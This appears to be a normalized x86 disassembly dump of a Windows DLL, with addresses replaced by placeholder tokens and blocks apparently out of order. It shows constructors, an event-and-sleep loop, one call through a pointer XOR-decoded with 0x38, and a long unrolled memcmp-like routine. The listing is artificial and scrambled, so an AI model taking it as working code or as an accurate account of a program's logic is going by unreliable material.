mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
jmp r-xdata
sub_10055710
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10065892
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_10055740
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_1003c66c
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
mov [ esi + 0x10 ] ecx
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1005576a
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
pop esi
retn
call sub_10055a1f
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_10055793
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_1007b7c3
add esp 0x14
pop ebp
retn
sub_100557be
push 0x14
mov eax sub_1007f5b8
call sub_1002152b
mov esi ecx
mov [ ebp - 0x1c ] esi
call sub_100680bc
xor ebx ebx
mov edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0xc ] bl
je r-xdata
mov eax [ edi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] r--data
jmp r-xdata
call sub_1004db01
retn 0x8
call sub_1000a66f
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x2e
mov [ ebp - 0x1c ] edx
call sub_1003088d
mov [ esi + 0xc ] ax
call sub_1000a66f
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x2c
mov [ ebp - 0x1c ] edx
call sub_1003088d
add esp 0x18
mov [ esi + 0xe ] ax
call sub_1000a66f
lea eax [ ebp - 0x20 ]
push eax
push ebx
push [ ebp - 0x14 ]
call sub_10027fa7
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_1000a66f
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
mov [ ebp - 0x14 ] edx
call sub_10023dc9
add esp 0xc
mov [ esi + 0x10 ] eax
call sub_1000a66f
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
mov [ ebp - 0x14 ] edx
call sub_10023dc9
add esp 0xc
mov [ esi + 0x14 ] eax
call sub_1000a66f
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x1c ] edx
movzx eax [ eax ]
push ebx
push eax
call sub_1003088d
mov [ esi + 0xc ] ax
call sub_1000a66f
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x1c ] edx
movzx eax [ eax ]
push ebx
push eax
call sub_1003088d
add esp 0x18
mov [ esi + 0xe ] ax
cmp [ ebp + 0xc ] bl
je r-xdata
sub_100558f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f1c4
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
call sub_1006b5be
mov [ esi + 0x8 ] eax
call sub_10058bff
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
mov edi eax
call sub_100014b7
mov eax [ edi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x10 ]
call sub_10050f50
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov [ esi + 0xc ] bl
xor eax eax
mov [ esi + 0x3c ] 0x7
mov [ esi + 0x38 ] ebx
mov [ esi + 0x28 ] ax
push 0x10
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x48 ] bx
mov [ esi + 0x4a ] bl
call sub_10055606
mov edi eax
add esp 0x4
mov [ ebp - 0x10 ] edi
cmp edi ebx
je r-xdata
inc eax
mov [ edi + 0x4 ] eax
xor edi edi
mov [ edi + 0x4 ] ebx
push r--data
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0x4
mov [ edi ] r--data
call sub_1004d460
call sub_1000a66f
lea ecx [ ebp - 0x38 ]
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] edx
call sub_10039680
mov [ edi ] r--data
jmp r-xdata
push edi
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_1003a310
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100559e6
push 0x3
call sub_1001bb2c
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_10017abb
push 0xff
call sub_10017abb
pop ecx
pop ecx
push 0x3
call sub_1001bb2c
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_10055a1f
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x30 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x1c ]
movzx eax ax
retn
mov eax [ ecx + 0x30 ]
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
retn
test eax eax
jle r-xdata
sub_10055a50
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x14 ]
mov ecx [ eax + 0x10 ]
push ebx
mov ebx [ eax + 0x8 ]
mov [ esp + 0x1c ] edx
mov edx [ eax + 0x1c ]
push esi
mov esi [ eax + 0x4 ]
mov [ esp + 0x1c ] ecx
mov ecx [ eax + 0x18 ]
mov [ esp + 0x28 ] edx
mov edx [ eax ]
push edi
mov [ esp + 0x28 ] ecx
mov ecx [ eax + 0x20 ]
push edx
mov [ esp + 0x18 ] ecx
call [ SetEvent@IAT ]
inc [ esi + 0x54 ]
cmp [ esi + 0x54 ] 0x5
jae r-xdata
mov [ esi + 0x50 ] 0xff000001
mov eax [ esi + 0x58 ]
cmp eax [ esi + 0x5c ]
jge r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
mov [ esi + 0x48 ] 0x2
call eax
lea ecx [ esp + 0x18 ]
push ecx
call [ GetSystemTimeAsFileTime@IAT ]
mov edx [ esp + 0x18 ]
mov [ esi + 0x68 ] edx
mov eax [ esp + 0x1c ]
mov edx [ esi ]
mov [ esi + 0x6c ] eax
mov eax [ edx + 0x14 ]
mov ecx esi
call eax
mov ecx [ esp + 0x14 ]
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ esi ]
xor eax eax
cmp [ esi + 0x50 ] eax
mov ecx esi
setne al
add eax 0x4
mov [ esi + 0x48 ] eax
mov eax [ edx + 0x4 ]
call eax
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
mov [ esi + 0x48 ] 0x3
call eax
cmp [ esi + 0x50 ] 0xffffffff
je r-xdata
push 0x0
push 0x0
push 0x1
push 0x0
call [ CreateEventW@IAT ]
mov ecx [ esp + 0x24 ]
mov edi eax
push edi
lea ecx [ ecx + ebx ]
call [ esp + 0x24 ]
push 0xffffffff
push edi
call [ WaitForSingleObject@IAT ]
mov eax [ rw-data ]
mov [ esp + 0x10 ] eax
xor [ esp + 0x10 ] 0x38
xor [ esp + 0x11 ] 0x38
xor [ esp + 0x12 ] 0x38
xor [ esp + 0x13 ] 0x38
push edi
call [ esp + 0x14 ]
mov ecx [ esi + 0x60 ]
imul ecx ecx 0x3e8
push ecx
call [ Sleep@IAT ]
inc [ esi + 0x58 ]
mov edx [ esi + 0x58 ]
cmp edx [ esi + 0x5c ]
jl r-xdata
sub_10055ba0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081589
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x14 ] esi
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
cmp ecx eax
je r-xdata
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] esi
mov [ ebx ] 0x0
mov [ ebp - 0x4 ] esi
mov esi [ edi ]
mov [ ebp - 0x14 ] 0x1
cmp esi [ edi + 0x4 ]
je r-xdata
push eax
call sub_10037530
add esp 0x4
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] eax
add [ ebp - 0x10 ] 0x1c
add esi 0x1c
cmp esi [ edi + 0x4 ]
jne r-xdata
push 0x1
push r--data
mov ecx ebx
call sub_10067f90
push 0xffffffff
push 0x0
push esi
mov ecx ebx
call sub_10035d20
mov ecx [ ebp - 0x10 ]
cmp ecx [ edi + 0x4 ]
je r-xdata
sub_10055c4b
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_1005711f ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
